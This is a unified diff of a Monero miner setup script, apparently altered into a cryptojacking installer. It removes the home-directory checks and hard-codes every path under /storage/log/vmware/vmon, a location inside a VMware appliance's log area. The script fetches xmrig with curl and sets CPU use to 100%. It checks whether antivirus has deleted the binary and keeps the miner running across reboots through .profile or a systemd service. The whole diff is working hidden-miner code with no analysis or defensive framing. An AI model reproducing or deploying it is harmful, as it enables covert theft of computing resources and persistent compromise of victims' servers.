@@ -30,18 +30,9 @@ if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
   echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
   exit 1
 fi
-$HOME='/storage/log/vmware/vmon'
 
-if [ -z $HOME ]; then
-  echo "ERROR: Please define HOME environment variable to your home directory"
-  exit 1
-fi
 
-if [ ! -d $HOME ]; then
-  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
-  echo '  export HOME=<dir>'
-  exit 1
-fi
+
 
 if ! type curl >/dev/null; then
   echo "ERROR: This script requires \"curl\" utility to work correctly"
@@ -122,7 +113,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/moneroocean/miner.sh script."
+echo "If needed, miner in foreground can be started by /storage/log/vmware/vmon//moneroocean/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -130,7 +121,7 @@ fi
 echo
 
 if ! sudo -n true 2>/dev/null; then
-  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
+  echo "Since I can't do passwordless sudo, mining in background will started from your /storage/log/vmware/vmon//.profile file first time you login this host after reboot."
 else
   echo "Mining in background will be performed using moneroocean_miner systemd service."
 fi
@@ -152,8 +143,8 @@ if sudo -n true 2>/dev/null; then
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HOME/moneroocean directory"
-rm -rf $HOME/moneroocean
+echo "[*] Removing /storage/log/vmware/vmon//moneroocean directory"
+rm -rf /storage/log/vmware/vmon//moneroocean
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
@@ -161,22 +152,22 @@ if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
-[ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
+echo "[*] Unpacking /tmp/xmrig.tar.gz to /storage/log/vmware/vmon//moneroocean"
+[ -d /storage/log/vmware/vmon//moneroocean ] || mkdir /storage/log/vmware/vmon//moneroocean
+if ! tar xf /tmp/xmrig.tar.gz -C /storage/log/vmware/vmon//moneroocean; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to /storage/log/vmware/vmon//moneroocean directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/moneroocean/config.json
-$HOME/moneroocean/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of /storage/log/vmware/vmon//moneroocean/xmrig works fine (and not removed by antivirus software)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' /storage/log/vmware/vmon//moneroocean/config.json
+/storage/log/vmware/vmon//moneroocean/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/moneroocean/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig is not functional"
+  if [ -f /storage/log/vmware/vmon//moneroocean/xmrig ]; then
+    echo "WARNING: Advanced version of /storage/log/vmware/vmon//moneroocean/xmrig is not functional"
   else 
-    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of /storage/log/vmware/vmon//moneroocean/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -189,26 +180,26 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to /storage/log/vmware/vmon//moneroocean"
+  if ! tar xf /tmp/xmrig.tar.gz -C /storage/log/vmware/vmon//moneroocean --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to /storage/log/vmware/vmon//moneroocean directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/moneroocean/config.json
-  $HOME/moneroocean/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of /storage/log/vmware/vmon//moneroocean/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /storage/log/vmware/vmon//moneroocean/config.json
+  /storage/log/vmware/vmon//moneroocean/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/moneroocean/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/moneroocean/xmrig is not functional too"
+    if [ -f /storage/log/vmware/vmon//moneroocean/xmrig ]; then
+      echo "ERROR: Stock version of /storage/log/vmware/vmon//moneroocean/xmrig is not functional too"
     else 
-      echo "ERROR: Stock version of $HOME/moneroocean/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of /storage/log/vmware/vmon//moneroocean/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/moneroocean/xmrig is OK"
+echo "[*] Miner /storage/log/vmware/vmon//moneroocean/xmrig is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -221,42 +212,42 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/moneroocean/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' /storage/log/vmware/vmon//moneroocean/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' /storage/log/vmware/vmon//moneroocean/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' /storage/log/vmware/vmon//moneroocean/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' /storage/log/vmware/vmon//moneroocean/config.json
+sed -i 's#"log-file": *null,#"log-file": "'/storage/log/vmware/vmon//moneroocean/xmrig.log'",#' /storage/log/vmware/vmon//moneroocean/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' /storage/log/vmware/vmon//moneroocean/config.json
 
-cp $HOME/moneroocean/config.json $HOME/moneroocean/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/moneroocean/config_background.json
+cp /storage/log/vmware/vmon//moneroocean/config.json /storage/log/vmware/vmon//moneroocean/config_background.json
+sed -i 's/"background": *false,/"background": true,/' /storage/log/vmware/vmon//moneroocean/config_background.json
 
 # preparing script
 
-echo "[*] Creating $HOME/moneroocean/miner.sh script"
-cat >$HOME/moneroocean/miner.sh <<EOL
+echo "[*] Creating /storage/log/vmware/vmon//moneroocean/miner.sh script"
+cat >/storage/log/vmware/vmon//moneroocean/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
-  nice $HOME/moneroocean/xmrig \$*
+  nice /storage/log/vmware/vmon//moneroocean/xmrig \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/moneroocean/miner.sh
+chmod +x /storage/log/vmware/vmon//moneroocean/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep moneroocean/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/moneroocean/miner.sh script to $HOME/.profile"
-    echo "$HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep moneroocean/miner.sh /storage/log/vmware/vmon//.profile >/dev/null; then
+    echo "[*] Adding /storage/log/vmware/vmon//moneroocean/miner.sh script to /storage/log/vmware/vmon//.profile"
+    echo "/storage/log/vmware/vmon//moneroocean/miner.sh --config=/storage/log/vmware/vmon//moneroocean/config_background.json >/dev/null 2>&1" >>/storage/log/vmware/vmon//.profile
   else 
-    echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like /storage/log/vmware/vmon//moneroocean/miner.sh script is already in the /storage/log/vmware/vmon//.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
-  /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in /storage/log/vmware/vmon//moneroocean/xmrig.log file)"
+  /bin/bash /storage/log/vmware/vmon//moneroocean/miner.sh --config=/storage/log/vmware/vmon//moneroocean/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -267,8 +258,8 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
-    /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in /storage/log/vmware/vmon//moneroocean/xmrig.log file)"
+    /bin/bash /storage/log/vmware/vmon//moneroocean/miner.sh --config=/storage/log/vmware/vmon//moneroocean/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -280,7 +271,7 @@ else
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
+ExecStart=/storage/log/vmware/vmon//moneroocean/xmrig --config=/storage/log/vmware/vmon//moneroocean/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -311,8 +302,8 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/storage/log/vmware/vmon//moneroocean/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/storage/log/vmware/vmon//moneroocean/config_background.json"
 fi
 echo ""
 
